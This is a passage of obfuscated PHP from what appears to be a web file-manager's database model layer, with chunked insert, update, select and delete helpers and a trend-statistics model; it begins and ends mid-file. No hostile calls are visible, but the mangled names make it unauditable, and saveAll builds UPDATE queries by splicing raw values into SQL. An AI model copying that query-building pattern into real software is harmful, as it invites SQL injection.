$ÅôüÑºÑ[0]; if (!in_array($·”“Ğİè, explode($·‰ïÀ«Ã[50], $ÅôüÑºÑ[2]))) { continue; } switch (trim($ÅôüÑºÑ[3])) { case $·‰ïÀ«Ã[398]: case $·‰ïÀ«Ã[399]: $–¢°‰à× = $ÅôüÑºÑ[1]; $çåÇ°íÇ = isset($ÅôüÑºÑ[4]) ? (array) $ÅôüÑºÑ[4] : array(); if ($–¢°‰à× == $·‰ïÀ«Ã[206] && array_key_exists($Šà¥“Éä, $ëÆ¤èÙó)) { if (!$ëÆ¤èÙó[$Šà¥“Éä]) { unset($ëÆ¤èÙó[$Šà¥“Éä]); } break; } if (isset($ëÆ¤èÙó[$Šà¥“Éä])) { array_unshift($çåÇ°íÇ, $ëÆ¤èÙó[$Šà¥“Éä]); } if ($·‰ïÀ«Ã[398] == $ÅôüÑºÑ[3]) { $ëÆ¤èÙó[$Šà¥“Éä] = call_user_func_array($–¢°‰à×, $çåÇ°íÇ); } else { $ëÆ¤èÙó[$Šà¥“Éä] = call_user_func_array(array(&$this, $–¢°‰à×), $çåÇ°íÇ); } break; case $·‰ïÀ«Ã[349]: if (isset($ëÆ¤èÙó[$Šà¥“Éä]) && $ëÆ¤èÙó[$Šà¥“Éä]) { $ëÆ¤èÙó[$Šà¥“Éä] = call_user_func_array(array(&$this, $ÅôüÑºÑ[1]), array($ëÆ¤èÙó[$Šà¥“Éä])); } break; case $·‰ïÀ«Ã[352]: $ëÆ¤èÙó[$Šà¥“Éä] = $ëÆ¤èÙó[$ÅôüÑºÑ[1]]; break; case $·‰ïÀ«Ã[371]: if (isset($ëÆ¤èÙó[$Šà¥“Éä]) && !is_string($ëÆ¤èÙó[$Šà¥“Éä])) { $ëÆ¤èÙó[$Šà¥“Éä] = json_encode_force($ëÆ¤èÙó[$Šà¥“Éä]); } break; case $·‰ïÀ«Ã[400]: if ($ëÆ¤èÙó[$Šà¥“Éä] === $·‰ïÀ«Ã[12]) { unset($ëÆ¤èÙó[$Šà¥“Éä]); } break; case $·‰ïÀ«Ã[401]: $ëÆ¤èÙó[$Šà¥“Éä] = $ÅôüÑºÑ[1]; default: break; } } if ($·”“Ğİè == $·‰ïÀ«Ã[432]) { $í®ÉÇï = strtolower($this->db->getDbType()); if (strpos($í®ÉÇï, $·‰ïÀ«Ã[13]) !== 0) { return; } $ã“á™—é = $this->field(!0)->fields; $úûÁ«‘± = $ã“á™—é[$·‰ïÀ«Ã[331]]; if (isset($ã“á™—é[$·‰ïÀ«Ã[330]])) { unset($úûÁ«‘±[$ã“á™—é[$·‰ïÀ«Ã[330]]]); } foreach ($úûÁ«‘± as $ ßÀ¤ıï => $·”“Ğİè) { if (!isset($ëÆ¤èÙó[$ ßÀ¤ıï])) { $ëÆ¤èÙó[$ ßÀ¤ıï] = $·‰ïÀ«Ã[12]; } } } } private function dataAfterFilter(&$İÛåã®¾) { $—ßç¼Åê =& $_SERVER[™¸œØ®Ü]; foreach ($this->dataAuto as $ıÙ¢»­) { $¹…¾¼¢º = $ıÙ¢»­[0]; if (!isset($İÛåã®¾[$¹…¾¼¢º])) { continue; } if (!in_array($—ßç¼Åê[434], explode($—ßç¼Åê[50], $ıÙ¢»­[2]))) { continue; } switch (trim($ıÙ¢»­[3])) { case $—ßç¼Åê[398]: case $—ßç¼Åê[399]: $ÒˆÖÕÔŠ = isset($ıÙ¢»­[4]) ? (array) $ıÙ¢»­[4] : array(); array_unshift($ÒˆÖÕÔŠ, $İÛåã®¾[$¹…¾¼¢º]); if (isset($ıÙ¢»­[4]) && $ıÙ¢»­[4] == $—ßç¼Åê[455]) { $ÒˆÖÕÔŠ = array($İÛåã®¾[$¹…¾¼¢º]); } if ($—ßç¼Åê[398] == $ıÙ¢»­[3]) { $İÛåã®¾[$¹…¾¼¢º] = call_user_func_array($ıÙ¢»­[1], $ÒˆÖÕÔŠ); } else { $İÛåã®¾[$¹…¾¼¢º] = call_user_func_array(array(&$this, $ıÙ¢»­[1]), $ÒˆÖÕÔŠ); } break; case $—ßç¼Åê[349]: if (isset($İÛåã®¾[$¹…¾¼¢º]) && $İÛåã®¾[$¹…¾¼¢º]) { $İÛåã®¾[$¹…¾¼¢º] = call_user_func_array(array(&$this, $ıÙ¢»­[1]), array($İÛåã®¾[$¹…¾¼¢º])); } break; case $—ßç¼Åê[352]: $İÛåã®¾[$¹…¾¼¢º] = $İÛåã®¾[$ıÙ¢»­[1]]; break; case $—ßç¼Åê[371]: $£ÙÜÑĞÜ = $İÛåã®¾[$¹…¾¼¢º]; $İÛåã®¾[$¹…¾¼¢º] = json_decode($£ÙÜÑĞÜ, !0); if (is_null($İÛåã®¾[$¹…¾¼¢º])) { $İÛåã®¾[$¹…¾¼¢º] = $£ÙÜÑĞÜ; } break; case $—ßç¼Åê[400]: if ($İÛåã®¾[$¹…¾¼¢º] === $—ßç¼Åê[12]) { unset($İÛåã®¾[$¹…¾¼¢º]); } break; case $—ßç¼Åê[401]: $İÛåã®¾[$¹…¾¼¢º] = $ıÙ¢»­[1]; break; default: break; } } } public function saveAll($ßÌÍ‚–Ó) { $‰æËÖûã =& $_SERVER[™¸œØ®Ü]; $Òµ©øßı = $this->tablePrefix . $this->tableName; $•çúßÉä = self::SQL_WHERE_IN_CHUNK; $ßÌÍ‚–Ó = is_array($ßÌÍ‚–Ó) ? $ßÌÍ‚–Ó : array(); $—½é½´ = $‰æËÖûã[456]; $ôÜÙ€Æè = 0; $—Œè»ˆ = array(); $ÄÊ ·ø— = count($ßÌÍ‚–Ó); for ($Â™„ğ = 0; $Â™„ğ < $ÄÊ ·ø—; $Â™„ğ++) { $Ñ¡ûÖñÔ = $ßÌÍ‚–Ó[$Â™„ğ]; if (!is_array($Ñ¡ûÖñÔ) || count($Ñ¡ûÖñÔ) != 4) { continue; } $½¬Ëè…İ = "\x55\120\x44\101\x54\x45\40\140{$Òµ©øßı}\140\x20\123\x45\x54\40{$Ñ¡ûÖñÔ[2]}\40\x3d\40\103\101\123\105\40{$Ñ¡ûÖñÔ[0]}\x20\12"; if ($ôÜÙ€Æè == 0) { $—½é½´ = $½¬Ëè…İ; } $—Œè»ˆ[] = $‰æËÖûã[121] . $Ñ¡ûÖñÔ[1] . $‰æËÖûã[121]; $ôÜÙ€Æè++; $—½é½´ .= "\x20\127\x48\105\116\40\x27{$Ñ¡ûÖñÔ[1]}\47\x20\124\x48\x45\116\40\47{$Ñ¡ûÖñÔ[3]}\47\40\12"; if ($ôÜÙ€Æè == $•çúßÉä || $Â™„ğ == $ÄÊ ·ø— - 1) { $´È‘Œç§ = implode($‰æËÖûã[50], $—Œè»ˆ); $—½é½´ .= "\40\105\x4e\104\40\40\x57\x48\x45\122\x45\x20{$Ñ¡ûÖñÔ[0]}\40\x49\116\40\x28{$´È‘Œç§}\x29\40"; $this->execute($—½é½´); $ôÜÙ€Æè = 0; $—½é½´ = $½¬Ëè…İ; $this->chunkEventCheck(count($—Œè»ˆ)); $—Œè»ˆ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ë › £) { $ñÇÑ‘ =& $_SERVER[™¸œØ®Ü]; $”Ü©Šª = $this->tablePrefix . $this->tableName; foreach ($ë › £ as $òş²å©¼) { if (!is_array($òş²å©¼) || count($òş²å©¼) != 4) { continue; } $æ¨æµ« = $òş²å©¼[0] . $ñÇÑ‘[457] . $òş²å©¼[1] . $ñÇÑ‘[121]; $üÅŞ÷¹û = $òş²å©¼[2] . $ñÇÑ‘[457] . $òş²å©¼[3] . $ñÇÑ‘[121]; $Í€ŠÓ¶ù = "\165\x70\x64\141\164\x65\40{$”Ü©Šª}\40\x73\145\164\40{$üÅŞ÷¹û}\40\x77\x68\x65\162\x65\x20{$æ¨æµ«}\x3b"; $this->execute($Í€ŠÓ¶ù); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ù¦Ö™ğñ = false, $¡Şçıã® = false) { $this->_chunkEvent = $ù¦Ö™ğñ; $this->_chunkEventParam = $¡Şçıã®; } private function chunkEventCheck($‹Òğè»Ø) { if (!$this->_chunkEvent) { return; } $™ŞÌ£¼“ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $™ŞÌ£¼“[$_SERVER[™¸œØ®Ü][458]] = $‹Òğè»Ø; Hook::trigger($this->_chunkEvent, $™ŞÌ£¼“); } public function addAll($í¥ƒ›Ù’, $‰»ÉŞ¨Ú = array(), $¾üÜŞõ = false) { $¡·ƒ ‚Ş =& $_SERVER[™¸œØ®Ü]; ignore_timeout(); $á±£Å® = self::SQL_WHERE_IN_CHUNK; if (empty($í¥ƒ›Ù’)) { $this->error = think_lang($¡·ƒ ‚Ş[350]); return !1; } $‰»ÉŞ¨Ú = $this->_parseOptions($‰»ÉŞ¨Ú); foreach ($í¥ƒ›Ù’ as $™—¨«÷¼ => $„¹«¶ëÊ) { $í¥ƒ›Ù’[$™—¨«÷¼] = $this->_facade($„¹«¶ëÊ); $this->_beforeInsert($í¥ƒ›Ù’[$™—¨«÷¼], $‰»ÉŞ¨Ú); } if (method_exists($this->db, $¡·ƒ ‚Ş[351])) { for ($ÈÁö«Ü¥ = 0; $ÈÁö«Ü¥ < count($í¥ƒ›Ù’); $ÈÁö«Ü¥ += $á±£Å®) { $‡¡ìª… = array_slice($í¥ƒ›Ù’, $ÈÁö«Ü¥, $á±£Å®); if (!is_array($‡¡ìª…) || count($‡¡ìª…) == 0) { break; } $Œö¨ÈÁ  = $this->db->insertAll($‡¡ìª…, $‰»ÉŞ¨Ú, $¾üÜŞõ); $this->chunkEventCheck(count($‡¡ìª…)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($í¥ƒ›Ù’ as $™—¨«÷¼ => $„¹«¶ëÊ) { $Œö¨ÈÁ  = $this->db->insert($„¹«¶ëÊ, $‰»ÉŞ¨Ú, $¾üÜŞõ); } $this->commit(); } if (!1 !== $Œö¨ÈÁ ) { $¯Äù®Ì¥ = $this->getLastInsID(); if ($¯Äù®Ì¥) { return $¯Äù®Ì¥; } } return $Œö¨ÈÁ ; } public function save($µÅß—Âñ = '', $·ÓÆôÕ = array()) { $¿„Èó‡µ =& $_SERVER[™¸œØ®Ü]; $€‘ñ¶¾ = self::SQL_WHERE_IN_CHUNK; $‡©äªÙ = $this->optionsValue(); $´¿Šå¯€ = $this->findWhereField($‡©äªÙ); if (!$´¿Šå¯€) { return parent::save($µÅß—Âñ, $·ÓÆôÕ); } $£®óÎç× = 0; $¯¸½Ö÷š = $‡©äªÙ[$¿„Èó‡µ[354]][$´¿Šå¯€][1]; $¯¸½Ö÷š = is_array($¯¸½Ö÷š) ? $¯¸½Ö÷š : array(); $ÉÂêÔèı = count($¯¸½Ö÷š); for ($§ˆ€Á¥ = 0; $§ˆ€Á¥ < $ÉÂêÔèı; $§ˆ€Á¥ += $€‘ñ¶¾) { $¦ïİƒœã = array_slice($¯¸½Ö÷š, $§ˆ€Á¥, $€‘ñ¶¾); if (!is_array($¦ïİƒœã) || count($¦ïİƒœã) == 0) { break; } $‡©äªÙ[$¿„Èó‡µ[354]][$´¿Šå¯€][1] = $¦ïİƒœã; $this->optionsValue($‡©äªÙ); $£®óÎç× += parent::save($µÅß—Âñ, $·ÓÆôÕ); $this->chunkEventCheck(count($¦ïİƒœã)); } $this->chunkEventSet(); return $£®óÎç×; } public function add($·öÕÕÄÄ = '', $ß³úø‹ = array(), $ÆôûõÏè = false) { if ($this->addTaskStatus && is_array($·öÕÕÄÄ)) { $this->addTaskData[] = $·öÕÕÄÄ; return; } return parent::add($·öÕÕÄÄ, $ß³úø‹, $ÆôûõÏè); } public function parseWhereLike($¬á¾°Ü§, $²µ¡ÀØÒ = '', $ÚåìÓæ™ = false, &$áñîõšä = false) { $®Ê–ºĞ¨ =& $_SERVER[™¸œØ®Ü]; $úÒäÖÁ¶ = $GLOBALS[$®Ê–ºĞ¨[6]][$®Ê–ºĞ¨[459]]; if (!$úÒäÖÁ¶[$®Ê–ºĞ¨[460]]) { return $¬á¾°Ü§; } if (!is_array($¬á¾°Ü§)) { return $¬á¾°Ü§; } $Š°Ÿ±Û = array(); $œ´—¤¡ = 0; foreach ($¬á¾°Ü§ as $Â´Ñì => $˜³ÔßÏÎ) { if (is_array($˜³ÔßÏÎ) && count($˜³ÔßÏÎ) == 2 && $˜³ÔßÏÎ[0] == $®Ê–ºĞ¨[461] && is_string($˜³ÔßÏÎ[1]) && substr($˜³ÔßÏÎ[1], 0, 1) == $®Ê–ºĞ¨[462] && substr($˜³ÔßÏÎ[1], strlen($˜³ÔßÏÎ[1]) - 1, 1) == $®Ê–ºĞ¨[462]) { $áñîõšä = !0; $´·¢ÃÁŞ = is_string($Â´Ñì) ? $Â´Ñì : $²µ¡ÀØÒ; $º©‡¡Ü¥ = substr($˜³ÔßÏÎ[1], 1, strlen($˜³ÔßÏÎ[1]) - 2); $º©‡¡Ü¥ = $this->db->escapeString($º©‡¡Ü¥); if (!strpos($´·¢ÃÁŞ, $®Ê–ºĞ¨[10])) { $´·¢ÃÁŞ = $®Ê–ºĞ¨[463] . $´·¢ÃÁŞ . $®Ê–ºĞ¨[463]; } $íÁØ—Æ• = $®Ê–ºĞ¨[222] . $º©‡¡Ü¥ . $®Ê–ºĞ¨[222]; $º©‡¡Ü¥ = str_replace(array($®Ê–ºĞ¨[10], $®Ê–ºĞ¨[464], $®Ê–ºĞ¨[11]), $®Ê–ºĞ¨[465], $º©‡¡Ü¥); if ($úÒäÖÁ¶[$®Ê–ºĞ¨[466]]) { $íÁØ—Æ• = $®Ê–ºĞ¨[467] . $º©‡¡Ü¥ . $®Ê–ºĞ¨[468]; if ($úÒäÖÁ¶[$®Ê–ºĞ¨[469]]) { $íÁØ—Æ• = $®Ê–ºĞ¨[468] . $º©‡¡Ü¥ . $®Ê–ºĞ¨[467]; } } $Š°Ÿ±Û[$œ´—¤¡] = $®Ê–ºĞ¨[470] . $´·¢ÃÁŞ . $®Ê–ºĞ¨[471] . $íÁØ—Æ• . $®Ê–ºĞ¨[472]; $œ´—¤¡++; continue; } if (is_array($˜³ÔßÏÎ)) { $²µ¡ÀØÒ = is_string($Â´Ñì) ? $Â´Ñì : $²µ¡ÀØÒ; $˜³ÔßÏÎ = $this->parseWhereLike($˜³ÔßÏÎ, $²µ¡ÀØÒ, !0, $áñîõšä); } if (is_numeric($Â´Ñì)) { $Š°Ÿ±Û[$œ´—¤¡] = $˜³ÔßÏÎ; $œ´—¤¡++; } else { $Š°Ÿ±Û[$Â´Ñì] = $˜³ÔßÏÎ; } } if ($áñîõšä && !$ÚåìÓæ™) { } return $Š°Ÿ±Û; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($İÛ’¼®œ = array()) { $‚†ÙÖØ­ =& $_SERVER[™¸œØ®Ü]; $İåœŠ = self::SQL_WHERE_IN_CHUNK; $…£×ÉÒƒ = $this->optionsValue(); $ë¼Èñ ë = $this->findWhereField($…£×ÉÒƒ); if (!$ë¼Èñ ë || isset($…£×ÉÒƒ[$‚†ÙÖØ­[369]]) || isset($…£×ÉÒƒ[$‚†ÙÖØ­[430]])) { return parent::select($İÛ’¼®œ); } $ËÚºĞŸ = $…£×ÉÒƒ[$‚†ÙÖØ­[354]][$ë¼Èñ ë][1]; $ËÚºĞŸ = is_array($ËÚºĞŸ) ? $ËÚºĞŸ : array(); $óËãËÇ¡ = null; for ($Ç˜ õåí = 0; $Ç˜ õåí < count($ËÚºĞŸ); $Ç˜ õåí += $İåœŠ) { $æğ¥ëÊ° = array_slice($ËÚºĞŸ, $Ç˜ õåí, $İåœŠ); if (!is_array($æğ¥ëÊ°) || count($æğ¥ëÊ°) == 0) { break; } $…£×ÉÒƒ[$‚†ÙÖØ­[354]][$ë¼Èñ ë][1] = $æğ¥ëÊ°; $this->optionsValue($…£×ÉÒƒ); $Ù†•‚Œ = parent::select($İÛ’¼®œ); if (!$Ù†•‚Œ) { continue; } $óËãËÇ¡ = is_array($óËãËÇ¡) ? $óËãËÇ¡ : array(); $óËãËÇ¡ = array_merge($óËãËÇ¡, $Ù†•‚Œ); } return $óËãËÇ¡; } public function delete($…ú“Ï— = array()) { $ÏÏÔ¸ÁŒ =& $_SERVER[™¸œØ®Ü]; $œ³÷ï¦ã = self::SQL_WHERE_IN_CHUNK; $´ş¦à¡İ = $this->optionsValue(); $üû€İ²œ = $this->findWhereField($´ş¦à¡İ); if (!$üû€İ²œ) { return parent::delete($…ú“Ï—); } $áÄÔ¥Õ¢ = 0; $ñ³­„§å = $´ş¦à¡İ[$ÏÏÔ¸ÁŒ[354]][$üû€İ²œ][1]; $ñ³­„§å = is_array($ñ³­„§å) ? $ñ³­„§å : array(); for ($Ô“ºéÈ¯ = 0; $Ô“ºéÈ¯ < count($ñ³­„§å); $Ô“ºéÈ¯ += $œ³÷ï¦ã) { $¯¦Å¤Òï = array_slice($ñ³­„§å, $Ô“ºéÈ¯, $œ³÷ï¦ã); if (!is_array($¯¦Å¤Òï) || count($¯¦Å¤Òï) == 0) { break; } $´ş¦à¡İ[$ÏÏÔ¸ÁŒ[354]][$üû€İ²œ][1] = $¯¦Å¤Òï; $this->optionsValue($´ş¦à¡İ); $áÄÔ¥Õ¢ += parent::delete($…ú“Ï—); } return $áÄÔ¥Õ¢; } private function findWhereField($¼Éâ‰‹) { $Ü™¡Ó‰ü =& $_SERVER[™¸œØ®Ü]; $²¹Ã¶á€ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¼Éâ‰‹) || !is_array($¼Éâ‰‹[$Ü™¡Ó‰ü[354]])) { return !1; } foreach ($¼Éâ‰‹[$Ü™¡Ó‰ü[354]] as $áÔİ¨ˆõ => $ŞœÌ°Ã) { if (is_array($ŞœÌ°Ã) && isset($ŞœÌ°Ã[0]) && is_string($ŞœÌ°Ã[0]) && strtolower($ŞœÌ°Ã[0]) == $Ü™¡Ó‰ü[7] && is_array($ŞœÌ°Ã[1]) && count($ŞœÌ°Ã[1]) > $²¹Ã¶á€) { ignore_timeout(); return $áÔİ¨ˆõ; } } return !1; } public function setMasterDB($ùìÆı— = true) { think_config($_SERVER[™¸œØ®Ü][473], $ùìÆı—); } } goto Fªã…÷ÓøŸ; EÜ¯Ï ŞÈ‰: class AnalysisModel extends ModelBaseLight { public function init($Èí¼¾¼£) { $¸’ÛŠŞ® =& $_SERVER[™¸œØ®Ü]; $¹ÑŒÉ½‚ = array($¸’ÛŠŞ®[669] => array($¸’ÛŠŞ®[33] => $¸’ÛŠŞ®[1924], $¸’ÛŠŞ®[352] => array($¸’ÛŠŞ®[284], $¸’ÛŠŞ®[850], $¸’ÛŠŞ®[1925], $¸’ÛŠŞ®[1926])), $¸’ÛŠŞ®[1927] => array($¸’ÛŠŞ®[33] => $¸’ÛŠŞ®[1928], $¸’ÛŠŞ®[352] => array($¸’ÛŠŞ®[284], $¸’ÛŠŞ®[848], $¸’ÛŠŞ®[1929], $¸’ÛŠŞ®[1930], $¸’ÛŠŞ®[1931]))); if (!isset($¹ÑŒÉ½‚[$Èí¼¾¼£])) { return !1; } $this->optionType = $¹ÑŒÉ½‚[$Èí¼¾¼£][$¸’ÛŠŞ®[33]]; $this->field = $¹ÑŒÉ½‚[$Èí¼¾¼£][$¸’ÛŠŞ®[352]]; return !0; } public function listData($ğŞº«¼ = false, $È’Ğ‹´Ÿ = "\x6d\157\x64\x69\146\x79\124\151\x6d\x65", $‡Óñù‰¬ = false) { return parent::listData($ğŞº«¼, $È’Ğ‹´Ÿ, $‡Óñù‰¬); } public function trendList($®¹ ½¼) { $ò‡›÷œ =& $_SERVER[™¸œØ®Ü]; $èî¥ é¥ = $this->listData(); if ($èî¥ é¥) { $»åû¼©ú = end($èî¥ é¥); $‰­Šİ—© = date($ò‡›÷œ[1932], strtotime($ò‡›÷œ[1933])); if ($»åû¼©ú[$ò‡›÷œ[284]] == $‰­Šİ—©) { return $èî¥ é¥; } $ŠÍçßâ— = strtotime($»åû¼©ú[$ò‡›÷œ[284]]); } if (!isset($ŠÍçßâ—)) { $ó»ò¶ûø = $®¹ ½¼ == $ò‡›÷œ[669] ? $ò‡›÷œ[601] : $ò‡›÷œ[915]; $ŠÍçßâ— = Model($ó»ò¶ûø)->min($ò‡›÷œ[233]); } $˜ßà•Ã« = $ò‡›÷œ[1934] . ucfirst($®¹ ½¼); $Ğ³ÄÏ”º = $this->dateList($ŠÍçßâ—); foreach ($Ğ³ÄÏ”º as $‰­Šİ—©) { $this->{$˜ßà•Ã«}($‰­Šİ—©); } return $this->listData(); } private function dateList($çÓÊí’) { $¾ôşĞÏô =& $_SERVER[™¸œØ®Ü]; $¼ÏÃ¶²ê = $çÓÊí’; $Î„Æ”Ê = strtotime($¾ôşĞÏô[1933]); $¦Ôıµüğ = array(); while ($¼ÏÃ¶²ê <= $Î„Æ”Ê) { $¦Ôıµüğ[] = date($¾ôşĞÏô[1932], $¼ÏÃ¶²ê); $¼ÏÃ¶²ê = strtotime($¾ôşĞÏô[1935], $¼ÏÃ¶²ê); } return $¦Ôıµüğ; } public function _recordUser($ĞÌÎº³¨ = '') { $±¬§›Ã‡ =& $_SERVER[™¸œØ®Ü]; $¯¯´³Ò÷ = strtotime(date($±¬§›Ã‡[1936], strtotime($ĞÌÎº³¨))); $µ…ˆ£Âò = strtotime(date($±¬§›Ã‡[1937], strtotime($ĞÌÎº³¨))); $¯†Íıç° = array($±¬§›Ã‡[233] => array($±¬§›Ã‡[1109], $µ…ˆ£Âò)); $€ù’³âÑ = Model($±¬§›Ã‡[601])->where($¯†Íıç°)->count($±¬§›Ã‡[1795]); $¯†Íıç°[$±¬§›Ã‡[233]] = array($±¬§›Ã‡[410], array($¯¯´³Ò÷, $µ…ˆ£Âò)); $¼·İü‡‡ = Model($±¬§›Ã‡[601])->where($¯†Íıç°)->count($±¬§›Ã‡[1795]); $¯†Íıç°[$±¬§›Ã‡[33]] = $±¬§›Ã‡[1938]; $¶í–ÄÂĞ = Model($±¬§›Ã‡[1939])->where($¯†Íıç°)->count($±¬§›Ã‡[1940]); $—‰‹Ä§µ = array($±¬§›Ã‡[284] => $ĞÌÎº³¨, $±¬§›Ã‡[850] => (int) $€ù’³âÑ, $±¬§›Ã‡[1925] => (int) $¼·İü‡‡, $±¬§›Ã‡[1926] => (int) $¶í–ÄÂĞ); return $this->insert($—‰‹Ä§µ); } public function _recordStore($À‹åı© = '') { $äŠê¡ò =& $_SERVER[™¸œØ®Ü]; $·ÑØ­«© = strtotime(date($äŠê¡ò[1937], strtotime($À‹åı©))); $œ¸©õî = array($äŠê¡ò[233] => array($äŠê¡ò[1109], $·ÑØ­«©)); $´–ş˜¤Ğ = Model($äŠê¡ò[548])->where($œ¸©õî)->sum($äŠê¡ò[79]); $œ¸©õî[$äŠê¡ò[487]] = 0; $…ºå›šğ = Model($äŠê¡ò[915])->where($œ¸©õî)->sum($äŠê¡ò[79]); $œ¸©õî[$äŠê¡ò[190]] = 1; $Œ®îÁ = Model($äŠê¡ò[915])->where($œ¸©õî)->sum($äŠê¡ò[79]); $œ¸©õî[$äŠê¡ò[190]] = 2; $£ÖÍ—êÚ = Model($äŠê¡ò[915])->where($œ¸©õî)->sum($äŠê¡ò[79]); $ÛĞİ¹Õ = array($äŠê¡ò[284] => $À‹åı©, $äŠê¡ò[848] => (int) $…ºå›šğ, $äŠê¡ò[1929] => (int) $´–ş˜¤Ğ, $äŠê¡ò[1930] => (int) $Œ®îÁ, $äŠê¡ò[1931] => (int) $£ÖÍ—êÚ); return $this->insert($ÛĞİ¹Õ); } public function trend($±‡„¹¸õ, $ş“ÏŞ¨ƒ) { $õ¶¨¥Ã¾ =& $_SERVER[™¸œØ®Ü]; if (!$this->init($±‡„¹¸õ)) { return !1; } $àÙÂÒĞş = $this->trendList($±‡„¹¸õ); if ($àÙÂÒĞş && $ş“ÏŞ¨ƒ != $õ¶¨¥Ã¾[1767]) { $èùø™· = $àÙÂÒĞş[0][$õ¶¨¥Ã¾[284]]; $®µšï³ê = $this->validDate($ş“ÏŞ¨ƒ, $èùø™·); $­éÀÑŠ¶ = array(); $­¾öÊÌ = array_to_keyvalue($àÙÂÒĞş, $õ¶¨¥Ã¾[284]); foreach ($®µšï³ê as $â¾¼ëÄ£) { if (isset($­¾öÊÌ[$â¾¼ëÄ£])) { $‚Ü®‘Œï = $­¾öÊÌ[$â¾¼ëÄ£]; } else { $‚Ü®‘Œï = end($àÙÂÒĞş); $‚Ü®‘Œï[$õ¶¨¥Ã¾[284]] = $â¾¼ëÄ£; if ($±‡„¹¸õ == $õ¶¨¥Ã¾[669]) { $‚Ü®‘Œï[$õ¶¨¥Ã¾[1925]] = $‚Ü®‘Œï[$õ¶¨¥Ã¾[1926]] = 0; } } $­éÀÑŠ¶[] = $‚Ü®‘Œï; } $àÙÂÒĞş = $­éÀÑŠ¶; } $ƒì¥Úé = array($õ¶¨¥Ã¾[669] => array($õ¶¨¥Ã¾[850] => LNG($õ¶¨¥Ã¾[1941]), $õ¶¨¥Ã¾[1925] => LNG($õ¶¨¥Ã¾[1942]), $õ¶¨¥Ã¾[1926] => LNG($õ¶¨¥Ã¾[1943])), $õ¶¨¥Ã¾[1927] => array($õ¶¨¥Ã¾[848] => LNG($õ¶¨¥Ã¾[1944]), $õ¶¨¥Ã¾[1929] => LNG($õ¶¨¥Ã¾[1945]), $õ¶¨¥Ã¾[1930] => LNG($õ¶¨¥Ã¾[1946]), $õ¶¨¥Ã¾[1931] => LNG($õ¶¨¥Ã¾[1947]))); $È°ª¶À = array($õ¶¨¥Ã¾[669] => $õ¶¨¥Ã¾[1948], $õ¶¨¥Ã¾[1927] => $õ¶¨¥Ã¾[79]); if (empty($àÙÂÒĞş)) { $â¾¼ëÄ£ = date($õ¶¨¥Ã¾[1932], strtotime($õ¶¨¥Ã¾[1933])); $ÀæÒ™É™ = array($õ¶¨¥Ã¾[284] => $â¾¼ëÄ£); foreach ($ƒì¥Úé[$±‡„¹¸õ] as $’òÜ»ÄÀ => $—éÀ¶ Ÿ) { $ÀæÒ™É™[$’òÜ»ÄÀ] = 0; } $àÙÂÒĞş[] = $ÀæÒ™É™; } $“•÷äÁ = array(); foreach ($àÙÂÒĞş as $—éÀ¶ Ÿ) { if ($±‡„¹¸õ == $õ¶¨¥Ã¾[1927] && $—éÀ¶ Ÿ[$õ¶¨¥Ã¾[1929]] > $—éÀ¶ Ÿ[$õ¶¨¥Ã¾[848]]) { $—éÀ¶ Ÿ[$õ¶¨¥Ã¾[1929]] = $—éÀ¶ Ÿ[$õ¶¨¥Ã¾[848]]; } foreach ($ƒì¥Úé[$±‡„¹¸õ] as $’òÜ»ÄÀ => $ù‰¥Ş¶) { $‚Ü®‘Œï = array($õ¶¨¥Ã¾[284] => $—éÀ¶ Ÿ[$õ¶¨¥Ã¾[284]], $õ¶¨¥Ã¾[1683] => $ù‰¥Ş¶); $‚Ü®‘Œï[$È°ª¶À[$±‡„¹¸õ]] = isset($—éÀ¶ Ÿ[$’òÜ»ÄÀ]) ? $—éÀ¶ Ÿ[$’òÜ»ÄÀ] : 0; $“•÷äÁ[] = $‚Ü®‘Œï; } } return $“•÷äÁ; } public function validDate($ˆ½İ®ï, $¸ù§ùÑ«) { $’œŠì™ =& $_SERVER[™¸œØ®Ü]; $ÚŸÙßŞ = date($’œŠì™[1932], strtotime($’œŠì™[1933])); $±­ì§Şæ = array($ÚŸÙßŞ); switch ($ˆ½İ®ï) { case $’œŠì™[1774]: $’ŸÖıì = mktime(0, 0, 0, date($’œŠì™[1949]), date($’œŠì™[1474]) - date($’œŠì™[1564]) + 7 - 7, date($’œŠì™[1950])); $²¢ìú = 0; do { $Ìˆî = date($’œŠì™[1932], $’ŸÖıì - 3600 * 24 * 7 * $²¢ìú); $±­ì§Şæ[] = $Ìˆî; $²¢ìú++; } while ($¸ù§ùÑ« < $Ìˆî); break; case $’œŠì™[1772]: $²¢ìú = 1; do { $É˜Æíõ’ = date($’œŠì™[1951], strtotime("\x2d\40{$²¢ìú}\40\x6d\x6f\156\x74\x68\x73")); $±­ì§Şæ[] = $É˜Æíõ’; $²¢ìú++; } while ($¸ù§ùÑ« < $É˜Æíõ’); break; case $’œŠì™[1952]: $¥à¡²ç = (int) date($’œŠì™[1950], strtotime($¸ù§ùÑ«)); $à¶‡ôùø = (int) date($’œŠì™[1950]); if ($¥à¡²ç >= $à¶‡ôùø) { break; } for ($¥à¡²ç; $¥à¡²ç < $à¶‡ôùø; $¥à¡²ç++) { $±­ì§Şæ[] = $¥à¡²ç . $’œŠì™[1953]; } break; default: break; } if ($¸ù§ùÑ« > end($±­ì§Şæ)) { array_pop($±­ì§Şæ); } sort($±­ì§Şæ); return $±­ì§Şæ; } public function listTable($éÖşØÂ„) { $Ñ’Ã¢Ã· = ucfirst($éÖşØÂ„); return Model($Ñ’Ã¢Ã·)->listData(); } public function option($¾×ñÔè) { $¯àÒóú = $_SERVER[™¸œØ®Ü][1954] . ucfirst($¾×ñÔè); return $this->{$¯àÒóú}(); } private function optionUser() { $šÚÒºöœ =& $_SERVER[™¸œØ®Ü]; $Œ³·‡öÊ = Model($šÚÒºöœ[601])->count($šÚÒºöœ[1795]); $—«¶‘‚Š = Model($šÚÒºöœ[601])->where($šÚÒºöœ[1955])->count($šÚÒºöœ[1795]); $Ã¬¨Ÿ‹Ë = intval($GLOBALS[$šÚÒºöœ[6]][$šÚÒºöœ[426]][$šÚÒºöœ[1740]]) / 3600; $Œ¥µŒø = strtotime("\x2d{$Ã¬¨Ÿ‹Ë}\40\150\157\x75\x72\163"); 